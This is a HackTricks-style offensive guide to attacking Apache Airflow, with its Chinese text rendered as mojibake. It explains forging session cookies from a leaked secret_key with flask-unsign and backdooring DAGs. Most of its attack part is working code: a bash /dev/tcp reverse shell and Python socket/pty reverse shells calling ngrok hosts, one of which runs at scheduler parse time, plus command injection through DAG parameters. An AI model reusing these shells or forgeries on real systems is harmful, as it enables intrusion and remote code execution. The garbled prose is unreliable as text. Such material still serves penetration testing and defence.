# Apache Airflow å®‰å…¨æ€§

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼Œæˆä¸º</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨ **HackTricks ä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š** æˆ– **ä¸‹è½½ HackTricks çš„ PDF**ï¼Œè¯·æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç° [**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„ [**NFTs é›†åˆ**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š **å…³æ³¨** æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## åŸºæœ¬ä¿¡æ¯

[**Apache Airflow**](https://airflow.apache.org) ç”¨äº **è°ƒåº¦å’Œç¼–æ’æ•°æ®ç®¡é“æˆ–å·¥ä½œæµ**ã€‚æ•°æ®ç®¡é“ç¼–æ’æŒ‡çš„æ˜¯åºåˆ—åŒ–ã€åè°ƒã€è°ƒåº¦å’Œç®¡ç†æ¥è‡ªä¸åŒæ¥æºçš„å¤æ‚ **æ•°æ®ç®¡é“**ã€‚è¿™äº›æ•°æ®ç®¡é“æä¾›çš„æ•°æ®é›†å¯ä¾›å•†ä¸šæ™ºèƒ½åº”ç”¨ç¨‹åºå’Œæ•°æ®ç§‘å­¦ã€æ”¯æŒå¤§æ•°æ®åº”ç”¨çš„æœºå™¨å­¦ä¹ æ¨¡å‹ä½¿ç”¨ã€‚

åŸºæœ¬ä¸Šï¼ŒApache Airflow å…è®¸æ‚¨åœ¨æŸäº›äº‹æƒ…ï¼ˆäº‹ä»¶ã€cronï¼‰**å‘ç”Ÿæ—¶** **å®‰æ’ä»£ç çš„æ‰§è¡Œ**ã€‚

## æœ¬åœ°å®éªŒå®¤

### Docker-Compose

æ‚¨å¯ä»¥ä½¿ç”¨æ¥è‡ª [**https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml**](https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml) çš„ **docker-compose é…ç½®æ–‡ä»¶** æ¥å¯åŠ¨ä¸€ä¸ªå®Œæ•´çš„ apache airflow docker ç¯å¢ƒã€‚ï¼ˆå¦‚æœæ‚¨ä½¿ç”¨çš„æ˜¯ MacOSï¼Œè¯·ç¡®ä¿ä¸º docker VM åˆ†é…è‡³å°‘ 6GB çš„ RAMï¼‰ã€‚

### Minikube

è¿è¡Œ **apache airflow** çš„ä¸€ç§ç®€å•æ–¹æ³•æ˜¯**ä½¿ç”¨ minikube è¿è¡Œå®ƒ**ï¼š
```bash
helm repo add airflow-stable https://airflow-helm.github.io/charts
helm repo update
helm install airflow-release airflow-stable/airflow
# Some information about how to aceess the web console will appear after this command

# Use this command to delete it
helm delete airflow-release
```
## Airflow é…ç½®

Airflow å¯èƒ½ä¼šåœ¨å…¶é…ç½®ä¸­å­˜å‚¨**æ•æ„Ÿä¿¡æ¯**ï¼Œæˆ–è€…æ‚¨å¯èƒ½ä¼šå‘ç°é…ç½®è¾ƒå¼±ï¼š

{% content-ref url="airflow-configuration.md" %}
[airflow-configuration.md](airflow-configuration.md)
{% endcontent-ref %}

## Airflow RBAC

åœ¨å¼€å§‹æ”»å‡» Airflow ä¹‹å‰ï¼Œæ‚¨åº”è¯¥äº†è§£**æƒé™å¦‚ä½•å·¥ä½œ**ï¼š

{% content-ref url="airflow-rbac.md" %}
[airflow-rbac.md](airflow-rbac.md)
{% endcontent-ref %}

## æ”»å‡»

### Web æ§åˆ¶å°æšä¸¾

å¦‚æœæ‚¨æœ‰**è®¿é—® web æ§åˆ¶å°**çš„æƒé™ï¼Œæ‚¨å¯èƒ½èƒ½å¤Ÿè®¿é—®ä»¥ä¸‹éƒ¨åˆ†æˆ–å…¨éƒ¨ä¿¡æ¯ï¼š

* **å˜é‡**ï¼ˆè‡ªå®šä¹‰æ•æ„Ÿä¿¡æ¯å¯èƒ½å­˜å‚¨åœ¨æ­¤å¤„ï¼‰
* **è¿æ¥**ï¼ˆè‡ªå®šä¹‰æ•æ„Ÿä¿¡æ¯å¯èƒ½å­˜å‚¨åœ¨æ­¤å¤„ï¼‰
* åœ¨ `http://<airflow>/connection/list/` è®¿é—®å®ƒä»¬
* [**é…ç½®**](./#airflow-configuration)ï¼ˆæ•æ„Ÿä¿¡æ¯å¦‚ **`secret_key`** å’Œå¯†ç å¯èƒ½å­˜å‚¨åœ¨æ­¤å¤„ï¼‰
* åˆ—å‡º**ç”¨æˆ·å’Œè§’è‰²**
* **æ¯ä¸ª DAG çš„ä»£ç **ï¼ˆå¯èƒ½åŒ…å«æœ‰è¶£çš„ä¿¡æ¯ï¼‰

### æ£€ç´¢å˜é‡å€¼

å˜é‡å¯ä»¥å­˜å‚¨åœ¨ Airflow ä¸­ï¼Œä»¥ä¾¿ **DAGs** å¯ä»¥**è®¿é—®**å®ƒä»¬çš„å€¼ã€‚è¿™ç±»ä¼¼äºå…¶ä»–å¹³å°çš„ç§˜å¯†ã€‚å¦‚æœæ‚¨æœ‰**è¶³å¤Ÿçš„æƒé™**ï¼Œæ‚¨å¯ä»¥åœ¨ GUI ä¸­é€šè¿‡ `http://<airflow>/variable/list/` è®¿é—®å®ƒä»¬ã€‚\
Airflow é»˜è®¤ä¼šåœ¨ GUI ä¸­æ˜¾ç¤ºå˜é‡çš„å€¼ï¼Œä½†æ ¹æ®[**è¿™ç¯‡æ–‡ç« **](https://marclamberti.com/blog/variables-with-apache-airflow/)ï¼Œå¯ä»¥è®¾ç½®ä¸€ä¸ª**å˜é‡åˆ—è¡¨**ï¼Œå…¶**å€¼**å°†åœ¨**GUI**ä¸­æ˜¾ç¤ºä¸º**æ˜Ÿå·**ã€‚

![](<../../.gitbook/assets/image (79).png>)

ç„¶è€Œï¼Œè¿™äº›**å€¼**ä»ç„¶å¯ä»¥é€šè¿‡**CLI**ï¼ˆæ‚¨éœ€è¦æœ‰æ•°æ®åº“è®¿é—®æƒé™ï¼‰ã€**ä»»æ„ DAG** æ‰§è¡Œã€è®¿é—®å˜é‡ç«¯ç‚¹çš„ **API**ï¼ˆéœ€è¦æ¿€æ´» APIï¼‰ï¼Œç”šè‡³æ˜¯**GUI æœ¬èº«**æ¥**æ£€ç´¢**ï¼\
****è¦ä» GUI è®¿é—®è¿™äº›å€¼ï¼Œåªéœ€**é€‰æ‹©æ‚¨æƒ³è®¿é—®çš„å˜é‡**ï¼Œç„¶å**ç‚¹å‡» Actions -> Export**ã€‚\
å¦ä¸€ç§æ–¹å¼æ˜¯å¯¹**éšè—å€¼**è¿›è¡Œ**æš´åŠ›ç ´è§£**ï¼Œä½¿ç”¨**æœç´¢è¿‡æ»¤**ç›´åˆ°è·å–å®ƒï¼š

![](<../../.gitbook/assets/image (30).png>)

### æƒé™æå‡

å¦‚æœ**`expose_config`** é…ç½®è®¾ç½®ä¸º **True**ï¼Œåˆ™ä»**ç”¨æˆ·è§’è‰²**åŠä»¥ä¸Šçš„ç”¨æˆ·å¯ä»¥åœ¨ç½‘é¡µä¸­**è¯»å–**é…ç½®ã€‚åœ¨æ­¤é…ç½®ä¸­ï¼Œ**`secret_key`** ä¼šæ˜¾ç¤ºï¼Œè¿™æ„å‘³ç€ä»»ä½•æ‹¥æœ‰æ­¤æœ‰æ•ˆå¯†é’¥çš„ç”¨æˆ·éƒ½å¯ä»¥**åˆ›å»ºè‡ªå·±çš„ç­¾å cookie æ¥å†’å……ä»»ä½•å…¶ä»–ç”¨æˆ·è´¦æˆ·**ã€‚
```bash
flask-unsign --sign --secret '<secret_key>' --cookie "{'_fresh': True, '_id': '12345581593cf26619776d0a1e430c412171f4d12a58d30bef3b2dd379fc8b3715f2bd526eb00497fcad5e270370d269289b65720f5b30a39e5598dad6412345', '_permanent': True, 'csrf_token': '09dd9e7212e6874b104aad957bbf8072616b8fbc', 'dag_status_filter': 'all', 'locale': 'en', 'user_id': '1'}"
```
### DAG åé—¨ï¼ˆAirflow å·¥ä½œèŠ‚ç‚¹ä¸­çš„ RCEï¼‰

å¦‚æœä½ æ‹¥æœ‰**å†™å…¥æƒé™**åˆ°**DAGs å­˜å‚¨ä½ç½®**ï¼Œä½ å¯ä»¥ç®€å•åœ°**åˆ›å»ºä¸€ä¸ª**å°†ä¼šç»™ä½ å‘é€**åå‘ shell**çš„ DAGã€‚\
æ³¨æ„ï¼Œè¿™ä¸ªåå‘ shell å°†ä¼šåœ¨**airflow å·¥ä½œå®¹å™¨**å†…æ‰§è¡Œï¼š
```python
import pendulum
from airflow import DAG
from airflow.operators.bash import BashOperator

with DAG(
dag_id='rev_shell_bash',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = BashOperator(
task_id='run',
bash_command='bash -i >& /dev/tcp/8.tcp.ngrok.io/11433  0>&1',
)
```

```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

with DAG(
dag_id='rev_shell_python',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python',
python_callable=rs,
op_kwargs={"rhost":"8.tcp.ngrok.io", "port": 11433}
)
```
### DAG åé—¨ (Airflow è°ƒåº¦å™¨ä¸­çš„ RCE)

å¦‚æœæ‚¨è®¾ç½®æŸäº›å†…å®¹åœ¨**ä»£ç æ ¹ç›®å½•**ä¸­**æ‰§è¡Œ**ï¼Œåœ¨æœ¬æ–‡å†™ä½œæ—¶ï¼Œå°†åœ¨å°†å…¶æ”¾å…¥ DAG æ–‡ä»¶å¤¹åå‡ ç§’é’Ÿå†…ç”±è°ƒåº¦å™¨**æ‰§è¡Œ**ã€‚
```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

rs("2.tcp.ngrok.io", 14403)

with DAG(
dag_id='rev_shell_python2',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python2',
python_callable=rs,
op_kwargs={"rhost":"2.tcp.ngrok.io", "port": 144}
```
### DAG åˆ›å»º

å¦‚æœæ‚¨è®¾æ³•**åœ¨ DAG é›†ç¾¤å†…éƒ¨çš„æœºå™¨ä¸Šå®æ–½æ¸—é€**ï¼Œæ‚¨å¯ä»¥åœ¨ `dags/` æ–‡ä»¶å¤¹ä¸­åˆ›å»ºæ–°çš„**DAG è„šæœ¬**ï¼Œå®ƒä»¬å°†ä¼šåœ¨ DAG é›†ç¾¤å†…çš„**å…¶ä»–æœºå™¨ä¸­å¤åˆ¶**ã€‚

### DAG ä»£ç æ³¨å…¥

å½“æ‚¨é€šè¿‡ GUI æ‰§è¡Œ DAG æ—¶ï¼Œæ‚¨å¯ä»¥å‘å®ƒ**ä¼ é€’å‚æ•°**ã€‚\
å› æ­¤ï¼Œå¦‚æœ DAG ç¼–ç ä¸å½“ï¼Œå¯èƒ½ä¼š**å®¹æ˜“å—åˆ°å‘½ä»¤æ³¨å…¥çš„æ”»å‡»**ã€‚\
è¿™å°±æ˜¯æ­¤ CVE ä¸­å‘ç”Ÿçš„æƒ…å†µï¼š[https://www.exploit-db.com/exploits/49927](https://www.exploit-db.com/exploits/49927)

æ‚¨éœ€è¦çŸ¥é“çš„æ‰€æœ‰ä¿¡æ¯ï¼Œä»¥**å¼€å§‹å¯»æ‰¾ DAG ä¸­çš„å‘½ä»¤æ³¨å…¥**ï¼Œå°±æ˜¯**å‚æ•°**æ˜¯é€šè¿‡ä»£ç **`dag_run.conf.get("param_name")`**æ¥**è®¿é—®**çš„ã€‚

æ­¤å¤–ï¼Œç›¸åŒçš„æ¼æ´å¯èƒ½å‘ç”Ÿåœ¨**å˜é‡**ä¸Šï¼ˆæ³¨æ„ï¼Œå¦‚æœæœ‰è¶³å¤Ÿçš„æƒé™ï¼Œæ‚¨å¯ä»¥åœ¨ GUI ä¸­**æ§åˆ¶å˜é‡çš„å€¼**ï¼‰ã€‚å˜é‡æ˜¯é€šè¿‡ä»¥ä¸‹æ–¹å¼**è®¿é—®**ï¼š
```python
from airflow.models import Variable
[...]
foo = Variable.get("foo")
```
å¦‚æœå®ƒä»¬ä¾‹å¦‚åœ¨bashå‘½ä»¤ä¸­ä½¿ç”¨ï¼Œä½ å¯ä»¥æ‰§è¡Œå‘½ä»¤æ³¨å…¥ã€‚

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸º</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœä½ æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°ä½ çš„å…¬å¸å¹¿å‘Š**æˆ–è€…**ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨**Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚

</details>
